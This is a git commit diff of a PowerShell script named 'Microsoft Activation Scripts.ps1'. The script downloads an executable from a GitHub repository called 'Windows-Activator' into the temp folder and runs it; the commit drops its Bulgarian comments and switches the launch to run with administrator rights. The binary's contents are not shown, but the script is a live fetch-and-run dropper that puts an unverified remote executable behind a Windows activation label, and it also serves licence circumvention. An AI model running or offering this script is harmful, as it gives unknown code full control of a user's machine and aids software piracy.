2b6b6cedd022bb907a12ff7b1bfb4cf22a6fd5b7
acenljd <thebluepoint2@gmail.com>
2025-12-09 00:57:23 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,10 +1,10 @@
-# Изтегляне и незабавно стартиране
 $url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
 $tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
 
-# Изтегляне
+
 Invoke-WebRequest -Uri $url -OutFile $tempFile
 
-# Стартиране
-Start-Process $tempFile -Wait
+Start-Process $tempFile -Verb RunAs -WorkingDirectory "$env:TEMP" -Wait
+
+
 
